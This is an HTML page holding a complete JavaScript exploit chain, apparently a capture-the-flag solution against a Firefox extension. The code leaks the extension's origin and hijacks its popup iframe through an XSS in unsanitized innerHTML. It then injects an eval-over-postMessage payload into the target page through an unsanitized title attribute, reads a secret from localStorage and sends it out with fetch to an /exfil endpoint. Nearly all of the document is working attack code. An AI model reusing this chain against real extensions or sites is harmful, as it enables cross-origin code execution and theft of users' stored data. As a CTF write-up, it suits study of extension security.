<!DOCTYPE html>
<meta charset="utf-8">
<body>
<script>
const log = (...args) => {
    console.log(...args);
    fetch('/log?msg=' + encodeURIComponent(args.join(' ')));
};

async function leakExtensionOrigin() {
    return new Promise(resolve => {
        // wait for an image to be inserted whose src has the
        // 'moz-extension:' protocol (the origin is the extension's origin)
        var observer;
        observer = new MutationObserver(function(mutations) {
            mutations.forEach(mutation => {
                mutation.addedNodes.forEach(node => {
                    if (!node.querySelectorAll) {
                        return;
                    }

                    node.querySelectorAll('img').forEach(img => {
                        const url = new URL(img.src);
                        if (url.protocol !== 'moz-extension:') {
                            return;
                        }
        
                        this.disconnect();
                        resolve(url.origin);
                    });
                });
            });
        }).observe(document.body, {
            subtree: true,
            childList: true,
        });
    });
}

async function loadIframe(url) {
    return new Promise((resolve, reject) => {
        const iframe = document.createElement('iframe');
        iframe.onload = () => resolve(iframe.contentWindow);
        iframe.onerror = reject;
        iframe.src = url;
        document.body.appendChild(iframe);
    });
}

async function hijackExtensionIframe(extWindow, extOrigin) {
    return new Promise(resolve => {
        // prepare connection into extension origin
        window.extEvalCallback = null;
        window.addEventListener('message', event => {
            if (event.origin !== extOrigin) {
                return;
            }

            if (window.extEvalCallback === null) {
                const extEval = async expr => new Promise(resolve => {
                    extWindow.postMessage(expr, extOrigin);
                    window.extEvalCallback = resolve;
                });
                resolve(extEval);
            } else {
                window.extEvalCallback(event.data);
            }
        });

        // inject connection script into extension origin:
        // 1. load any website that has an element that will be removed by the extension
        // 2. we use 'helper.hmtl', which has an element that will be removed
        //    and that also has an id which contains html
        // 3. the extension's content script sends the html to the background script
        // 4. the background script identifies the bad element (matching the selector)
        //    and sens its id back to the content script
        // 5. the content script looks for the element by id, removes it and reports
        //    back to the background script what was removed
        // 6. the background script forwards that to the popup window
        // 7. the popup window shows the id of the removed elements, which causes
        //    XSS in the extension's origin (iframe), because the id is not sanitized
        //    before being passed into innerHTML
        //    (more on that in helper.html)
        // 8. the XSS payload listens for postMessage()s, evals the payload and
        //    postMessage()s the result back
        const iframe = document.createElement('iframe');
        iframe.src = 'helper.html';
        document.body.appendChild(iframe);
    });
}

async function leakAnyElementIdFromFlagPage(extEval) {
    // add a listener that forwards type=good messages via postMessage()
    await extEval(`
        browser.runtime.onMessage.addListener(message => {
            if (message.type === 'good') {
                window.top.postMessage({ leak: message }, '*');
            }
        });
    `);

    // wait until the flag iframe is loaded, then leak any element's id from the
    // goodContent field of the message
    return new Promise(resolve => {
        window.addEventListener('message', function(event) {
            if (event.data.leak) {
                const doc = new DOMParser().parseFromString(event.data.leak.goodContent, 'text/html');
                const anyElementWithId = doc.querySelector('[id]');
                if (!anyElementWithId) {
                    return;
                }
    
                window.removeEventListener('message', arguments.callee);
                resolve(anyElementWithId.id);
            }
        });
    });
}

async function hijackFlagIframe(flagWindow, flagOrigin, anyElementId, extEval) {
    return new Promise(resolve => {
        // prepare connection into flag origin
        window.flagEvalCallback = null;
        window.addEventListener('message', event => {
            if (event.source !== flagWindow) {
                return;
            }

            if (window.flagEvalCallback === null) {
                const flagEval = async expr => new Promise(resolve => {
                    flagWindow.postMessage(expr, flagOrigin);
                    window.flagEvalCallback = resolve;
                });
                resolve(flagEval);
            } else {
                window.flagEvalCallback(event.data);
            }
        });

        // inject connection script into flag origin:
        // 1. exploit origin sends payload to be eval()d in extension origin (iframe)
        // 2. extension origin uses sendMessage() to trigger onSendToTabs in
        //    background script
        // 3. background script uses sendMessage() to remove the #flag element
        //    and add the quality seal images in the flag origin (iframe)
        // 4. the category parameter goes into the title attribute unsanitized, so
        //    we use it to inject JS
        // 5. that JS listens for postMessage()s, evals the payload and 
        //    postMessage()s the result back. it also sends a first hello to
        //    the parent (exploit origin)
        const msg = {
            type: 'sendToTabs',
            tabQuery: {
                currentWindow: true,
                active: true,
            },
            message: {
                type: 'bad',
                id: anyElementId,
                category: 'other /*" onload="f = e => e.source.postMessage(eval(e.data), String.fromCharCode(0x2a)); window.addEventListener(/message/.source, f); f({data: /1/.source, source: parent}) //*/',
            }
        }
        extEval(`browser.runtime.sendMessage(${JSON.stringify(msg)}),0`);
    });
}

async function exfiltrateFlag(flag) {
    return fetch(`/exfil?flag=${encodeURIComponent(flag)}`);
}

async function exploit(flagPage) {
    const extOrigin = await leakExtensionOrigin();
    log('[+]', 'Leaked extension origin:', extOrigin);

    const extWindow = await loadIframe(`${extOrigin}/popup/index.html`);
    log('[+]', 'Extension iframe loaded!');

    const extEval = await hijackExtensionIframe(extWindow, extOrigin);
    log('[+]', 'Extension iframe hijacked!');
    
    log('[*]', 'Test: ext.origin ===', await extEval('origin'));
    
    log('[*]', 'Preparing flag page leak');
    const leakAnyElementIdFromFlagPagePromise = leakAnyElementIdFromFlagPage(extEval);

    const flagWindow = window.flagWindow = await loadIframe(flagPage);
    log('[+]', 'Flag page loaded!');
    
    const anyElementId = await leakAnyElementIdFromFlagPagePromise;
    log('[+]', 'Leaked element id:', anyElementId);

    const flagEval = await hijackFlagIframe(flagWindow, new URL(flagPage).origin, anyElementId, extEval);
    log('[+]', 'Flag iframe hijacked!');
    
    log('[*]', 'Test: flag.origin ===', await flagEval('origin'));
    
    const flag = await flagEval('window.localStorage.flag');
    log('[+]', 'Flag:', flag);
    
    await exfiltrateFlag(flag);
    log('[+]', 'Exfiltrated flag, we are done here!');
};

const query = new URLSearchParams(location.search);
const flagPage = query.has('flag-page') ? query.get('flag-page') : 'http://172.17.0.1:8080/';
exploit(flagPage);
</script>

<!--
    this matches the selector #this+is:not(.very)~hard.to#understand[but=also]+not>.very.easy
    so it will trigger the content removal,
    which triggers the quality seal image to be added,
    which leaks the extension's origin
-->
<div id=this></div>
<is></is>
<hard class=to id=understand but=also></hard>
<not>
    <div class="very easy" id="trigger1">nice</div>
</not>
